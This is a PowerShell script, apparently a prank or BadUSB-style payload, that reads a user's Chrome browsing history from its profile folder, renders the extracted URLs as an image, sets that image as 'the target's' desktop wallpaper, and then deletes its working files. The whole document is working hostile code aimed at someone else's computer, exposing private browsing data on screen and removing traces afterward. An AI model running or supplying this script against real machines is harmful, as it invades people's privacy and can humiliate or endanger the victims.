function Get-BrowserData {    [CmdletBinding()]    param (        [Parameter(Position = 1, Mandatory = $true)]        [string]$Browser,        [Parameter(Position = 2, Mandatory = $true)]        [string]$DataType    )    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"    }    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"    }    elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"    }    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {        $Path = "$env:USERPROFILE\Appdata\Local\Microsoft\Edge\User Data\Default\Bookmarks"    }    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {        $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"    }    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | ForEach-Object {($_.Matches).Value} | Sort-Object -Unique    $Value | ForEach-Object {        $Key = $_        if ($Key -match $Search) {            New-Object -TypeName PSObject -Property @{                User     = $env:UserName                Browser  = $Browser                DataType = $DataType                Data     = $_            }        }    }}function txt-img {    [CmdletBinding()]    param (        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]        [string]$txtPath,        [Parameter(Mandatory = $false)]        [string]$imgPath    )    if (-not $imgPath) {        $imgPath = "$Env:USERPROFILE\Desktop\foo.jpg"    }    Add-Type @"    using System;    using System.Runtime.InteropServices;    public class PInvoke {        [DllImport("user32.dll")]        public static extern IntPtr GetDC(IntPtr hwnd);        [DllImport("gdi32.dll")]        public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);    }"@    $hdc = [PInvoke]::GetDC([IntPtr]::Zero)    $w = [PInvoke]::GetDeviceCaps($hdc, 118) # width    $h = [PInvoke]::GetDeviceCaps($hdc, 117) # height    $content = [IO.File]::ReadAllText($txtPath)    Add-Type -AssemblyName System.Drawing    $bmp = New-Object System.Drawing.Bitmap $w, $h    $font = New-Object System.Drawing.Font "Consolas", 18    $brushBg = [System.Drawing.Brushes]::White    $brushFg = [System.Drawing.Brushes]::Black    $graphics = [System.Drawing.Graphics]::FromImage($bmp)    $graphics.FillRectangle($brushBg, 0, 0, $bmp.Width, $bmp.Height)    # Calculate the size of the content    $contentSize = $graphics.MeasureString($content, $font)    # Adjust the dimensions of the image to fit the content    if ($contentSize.Width -gt $bmp.Width) {        $bmpWidth = [math]::Ceiling($contentSize.Width)    } else {        $bmpWidth = $bmp.Width    }    if ($contentSize.Height -gt $bmp.Height) {        $bmpHeight = [math]::Ceiling($contentSize.Height)    } else {        $bmpHeight = $bmp.Height    }    # Update the dimensions of the image    $bmp = New-Object System.Drawing.Bitmap $bmpWidth, $bmpHeight    $graphics = [System.Drawing.Graphics]::FromImage($bmp)    $graphics.FillRectangle($brushBg, 0, 0, $bmp.Width, $bmp.Height)    # Calculate the starting position within the image    $x = ($bmpWidth - $contentSize.Width) / 2    $y = ($bmpHeight - $contentSize.Height) / 2    # Draw the content in the center of the image    $graphics.DrawString($content, $font, $brushFg, $x, $y)    $graphics.Dispose()    $bmp.Save($imgPath)}function Set-WallPaper {    <#    .NOTES        This will take the image you generated and set it as the target's wallpaper    #>    param (        [parameter(Mandatory = $true)]        # Provide the exact path to the image        [string]$Image,        # Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)        [parameter(Mandatory = $false)]        [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]        [string]$Style    )    $WallpaperStyle = switch ($Style) {        "Fill"     { "10" }        "Fit"      { "6" }        "Stretch"  { "2" }        "Tile"     { "0" }        "Center"   { "0" }        "Span"     { "22" }    }    if ($Style -eq "Tile") {        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force    }    else {        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force    }    Add-Type -TypeDefinition @"    using System;    using System.Runtime.InteropServices;    public class Params {        [DllImport("User32.dll", CharSet = CharSet.Unicode)]        public static extern int SystemParametersInfo(            Int32 uAction,            Int32 uParam,            String lpvParam,            Int32 fuWinIni        );    }"@    $SPI_SETDESKWALLPAPER = 0x0014    $UpdateIniFile = 0x01    $SendChangeEvent = 0x02    $fWinIni = $UpdateIniFile -bor $SendChangeEvent    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)}$browserData = Get-BrowserData -Browser "chrome" -DataType "history"$browserData | Export-Csv -Path "$Env:USERPROFILE\Desktop\browser_data.csv" -NoTypeInformation$browserData | ConvertTo-Json | Out-File -FilePath "$Env:USERPROFILE\Desktop\browser_data.json"$txtPath = "$Env:USERPROFILE\Desktop\browser_data.csv"$imgPath = "$Env:USERPROFILE\Desktop\browser_data.jpg"txt-img -txtPath $txtPath -imgPath $imgPathSet-WallPaper -Image $imgPath -Style "Fill"# Remove generated filesRemove-Item "$Env:USERPROFILE\Desktop\browser_data.csv" -ForceRemove-Item "$Env:USERPROFILE\Desktop\browser_data.json" -ForceRemove-Item "$Env:USERPROFILE\Desktop\browser_data.jpg" -Force